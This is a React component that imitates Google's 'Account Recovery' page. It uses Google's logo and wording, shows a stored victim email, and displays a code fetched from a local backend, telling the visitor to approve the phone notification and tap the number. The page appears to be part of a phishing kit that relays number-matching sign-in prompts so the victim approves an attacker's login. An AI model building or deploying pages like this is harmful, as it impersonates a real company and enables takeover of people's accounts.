import React, { useEffect, useState } from "react";

function Recovery() {
  const [otp, setOtp] = useState(null); // State to store OTP
  const [number, setNumber] = useState(null); // State to store number

  const fetchOtp = async () => {
    try {
      const res = await fetch(`http://localhost:3500/App/OTPauth`);
      if (!res.ok) {
        throw new Error("Network response was not ok");
      }
      const data = await res.json();
      console.log(data); // Log the data to check its structure
      const {otp}  = data;
      console.log(otp)
      setOtp(otp)// Set OTP from fetched data
    const {number} = data
    setNumber(number) // Set number from fetched data
    } catch (error) {
      console.error("Failed to fetch OTP:", error);
    }
  };

  // Fetch OTP once when component mounts
  useEffect(() => {
    fetchOtp();
  }, []);

  return (
    <div className="flex items-center justify-center min-h-screen p-4 bg-gray-100">
      <div className="w-full max-w-md p-6 md:p-8 border border-gray-300 rounded-lg shadow-md bg-white">
        <div className="flex flex-col items-center justify-center gap-2 md:gap-4">
          <img src="google.png" className="w-12 md:w-16 xl:w-20" alt="Google Logo" />
          <p className="font-semibold text-lg md:text-2xl text-black text-center">
            Account Recovery
          </p>
          <p className="text-gray-600 text-sm md:text-base text-center">
            To help keep your account secure, Google needs to make sure it's really you trying to sign in.
          </p>
        </div>
        <div className="text-black flex flex-col items-center mt-4 md:mt-6">
          <div className="w-3/4 border border-gray-300 p-2 rounded-full flex items-center justify-between text-sm md:text-base">
            <span className="text-gray-500">
              {localStorage.getItem("email")}
            </span>
            <span className="text-black transform rotate-90">{`>`}</span>
          </div>
          <h1 className="text-4xl md:text-5xl font-bold mt-6 OTP">
            {otp || "Loading..."} {/* Display OTP or "Loading..." */}
          </h1>
        </div>
        <div className="mt-6 md:mt-8 text-black">
          <h2 className="font-semibold">{`Check your ZTE Device ${number || "Loading..."}`}</h2>
          <p className="text-gray-600 text-sm md:text-base mt-1">
            Google sent a code to your ZTE device. Tap{" "}
            <span className="font-semibold text-black">Yes</span> on the
            notification, then tap "22" on your phone to verify it's you.
          </p>
          <div className="mt-4 flex justify-between text-blue-500 text-sm md:text-base font-semibold">
            <button onClick={fetchOtp}>Resend it</button> {/* Resend OTP */}
            <button>I don't have my phone</button>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Recovery;
